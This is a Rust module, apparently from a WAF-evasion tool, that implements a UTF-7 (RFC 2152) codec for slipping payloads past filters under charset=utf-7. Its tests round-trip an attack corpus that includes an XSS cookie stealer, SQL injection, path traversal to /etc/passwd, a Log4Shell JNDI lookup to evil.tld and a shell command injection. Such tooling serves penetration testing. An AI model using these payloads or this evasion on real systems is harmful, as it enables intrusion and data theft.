//! UTF-7 (RFC 2152) codec — a foundational, self-contained primitive.
//!
//! Lives here in `wafrift-types` (alongside [`crate::hash`]) rather than in
//! `wafrift-encoding` so BOTH `wafrift-encoding` (as an encoding strategy)
//! and `wafrift-grammar` (for the `charset=utf-7` delivery shape) can reuse
//! ONE source of truth without `grammar` having to depend on the heavy
//! `encoding` crate (which pulls native `brotli`/`flate2`). `encoding`
//! re-exports `utf7_encode`/`utf7_decode` for backward compatibility.
//!
//! The round-trip identity `utf7_decode(utf7_encode(s)) == Some(s)` is the
//! soundness basis for delivering a payload under `charset=utf-7`: a
//! UTF-7-honoring backend recovers the exact bytes the operator supplied.

use base64::{Engine as _, engine::general_purpose};

/// Encode a single Unicode scalar value to UTF-16 BE bytes.
fn char_to_utf16be(c: char) -> Vec<u8> {
    let mut buf = [0u16; 2];
    let enc = c.encode_utf16(&mut buf);
    let mut out = Vec::with_capacity(enc.len() * 2);
    for u in enc {
        out.push((*u >> 8) as u8);
        out.push((*u & 0xFF) as u8);
    }
    out
}

/// Modified Base64 for UTF-7 (RFC 2152) — standard alphabet without padding.
fn modified_base64(bytes: &[u8]) -> String {
    let mut b64 = general_purpose::STANDARD.encode(bytes);
    b64.retain(|c| c != '=');
    b64
}

/// RFC 2152 direct characters.
fn is_utf7_direct(ch: char) -> bool {
    matches!(
        ch,
        'A'..='Z'
            | 'a'..='z'
            | '0'..='9'
            | '\''
            | '('
            | ')'
            | ','
            | '-'
            | '.'
            | '/'
            | ':'
            | '?'
    )
}

/// UTF-7 encoding per RFC 2152.
///
/// **Context**: `iis`, `legacy-dotnet` — only safe where the target actually
/// decodes UTF-7.
#[must_use]
pub fn utf7_encode(payload: &str) -> String {
    let mut out = String::new();
    let mut shift_buf: Vec<u8> = Vec::new();

    fn flush_shift(out: &mut String, buf: &mut Vec<u8>) {
        if !buf.is_empty() {
            out.push('+');
            out.push_str(&modified_base64(buf));
            out.push('-');
            buf.clear();
        }
    }

    for ch in payload.chars() {
        if ch == '+' {
            flush_shift(&mut out, &mut shift_buf);
            out.push_str("+-");
        } else if is_utf7_direct(ch) {
            flush_shift(&mut out, &mut shift_buf);
            out.push(ch);
        } else {
            shift_buf.extend_from_slice(&char_to_utf16be(ch));
        }
    }
    flush_shift(&mut out, &mut shift_buf);
    out
}

/// True for a byte in the modified-Base64 alphabet (RFC 2152: the standard
/// `A-Za-z0-9+/` set, no padding). `-` is NOT in it, so it unambiguously
/// terminates a shift sequence.
fn is_modified_base64_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'+' || b == b'/'
}

/// UTF-8 lead-byte length, for passing direct (non-shifted) bytes through
/// the UTF-7 decoder intact.
fn utf8_lead_len(first: u8) -> usize {
    match first {
        0x00..=0x7F => 1,
        0xC0..=0xDF => 2,
        0xE0..=0xEF => 3,
        _ => 4,
    }
}

/// Decode UTF-7 (RFC 2152) — the inverse of [`utf7_encode`], i.e. exactly
/// what a UTF-7-honoring backend computes. `+` opens a shift sequence of
/// modified-Base64 carrying UTF-16BE code units, terminated by `-` (absorbed)
/// or any non-Base64 byte (kept); `+-` is a literal `+`; every other byte
/// passes through. Returns `None` on malformed Base64, an odd UTF-16 byte
/// count, or unpaired surrogates — so a caller proving round-trip soundness
/// treats undecodable input as "not recoverable" rather than guess.
#[must_use]
pub fn utf7_decode(s: &str) -> Option<String> {
    let b = s.as_bytes();
    let mut out = String::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'+' {
            // `+-` → literal `+`.
            if i + 1 < b.len() && b[i + 1] == b'-' {
                out.push('+');
                i += 2;
                continue;
            }
            // Gather the modified-Base64 run.
            let start = i + 1;
            let mut j = start;
            while j < b.len() && is_modified_base64_byte(b[j]) {
                j += 1;
            }
            let mut chunk = s[start..j].to_string();
            while !chunk.len().is_multiple_of(4) {
                chunk.push('='); // re-pad for the standard decoder
            }
            let raw = general_purpose::STANDARD.decode(chunk.as_bytes()).ok()?;
            if raw.len() % 2 != 0 {
                return None; // UTF-16BE is 2 bytes per code unit
            }
            let units: Vec<u16> = raw
                .chunks_exact(2)
                .map(|c| (u16::from(c[0]) << 8) | u16::from(c[1]))
                .collect();
            out.push_str(&String::from_utf16(&units).ok()?);
            i = j;
            if i < b.len() && b[i] == b'-' {
                i += 1; // absorb the explicit terminator
            }
        } else {
            let len = utf8_lead_len(b[i]);
            if i + len > b.len() {
                return None;
            }
            out.push_str(s.get(i..i + len)?);
            i += len;
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::{utf7_decode, utf7_encode};

    #[test]
    fn utf7_basic_encode() {
        assert_eq!(utf7_encode("Hello"), "Hello"); // direct chars pass through
        assert_eq!(utf7_encode("A+B"), "A+-B"); // `+` escaped
        assert!(utf7_encode("日本語").starts_with('+')); // non-ASCII shifted
    }

    #[test]
    fn utf7_decode_matches_canonical_vectors() {
        // The well-known UTF-7 XSS vector and the literal-plus escape.
        assert_eq!(utf7_decode("+ADw-script+AD4-").as_deref(), Some("<script>"));
        assert_eq!(utf7_decode("+-").as_deref(), Some("+"));
        assert_eq!(utf7_decode("hello").as_deref(), Some("hello"));
        // And the encoder produces exactly that canonical vector.
        assert_eq!(utf7_encode("<script>"), "+ADw-script+AD4-");
    }

    #[test]
    fn utf7_round_trips_attack_corpus_and_unicode() {
        // SOUNDNESS basis for a charset=utf-7 delivery: a UTF-7 backend
        // (utf7_decode) recovers the EXACT operator payload for every member.
        let corpus = [
            "<script>alert(document.cookie)</script>",
            "' OR '1'='1' -- ",
            "1 UNION SELECT password FROM users",
            "../../../../etc/passwd",
            "${jndi:ldap://evil.tld/a}",
            "; cat /etc/passwd",
            "plain ascii",
            "+already+plus+",
            "café ☕ 日本語 😀 surrogate-pair",
            "",
            "=",
            "<>\"'&;|()[]{}",
        ];
        for p in corpus {
            let enc = utf7_encode(p);
            assert_eq!(
                utf7_decode(&enc).as_deref(),
                Some(p),
                "UTF-7 round-trip lost bytes for {p:?} via {enc}"
            );
        }
    }
}
